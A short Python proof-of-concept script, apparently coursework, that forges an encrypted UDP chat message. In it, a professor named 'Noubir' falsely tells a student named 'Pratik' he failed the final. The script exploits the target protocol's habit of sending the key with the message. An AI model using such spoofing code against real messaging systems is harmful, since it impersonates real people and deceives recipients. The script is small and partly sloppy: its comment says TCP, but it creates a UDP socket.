
# standard
import os
import sys
import socket

# custom
from df_key import DiffieHellman

# installed
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

BACKEND = default_backend()

####################################

HOST = '0.0.0.0'
PORT = int(sys.argv[1])

RECV = 65535

####################################
# fake message exploit
####################################

TARGET = "pratik"

A = DiffieHellman()
DH_CLIENT = str(A.publicKey)

message = "qwertyHey Pratik!  It's me, Prof. Noubir.  I'm afraid you failed the final."

xtra_b     = 16 - (len(message) % 16)
pad_bytes   = len(chr(xtra_b)*xtra_b)
message += ('X' * pad_bytes)

# 1) send LOGIN (CREATE NEW SOCKET!)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)   # CREATING TCP socket and handling exception
s.bind((HOST, 0))

key = os.urandom(32)
iv  = os.urandom(16)

cipher = Cipher(algorithms.AES(key),modes.CBC(iv), backend=BACKEND)
encryptor = cipher.encryptor()
encpy_msg = encryptor.update(message) + encryptor.finalize()

L = ["message", None, None, None, None]

L[1] = encpy_msg
L[2] = iv
L[3] = str(pad_bytes)
L[4] = key

msg = 'qwerty'.join(L)

s.sendto(msg, (HOST, PORT))
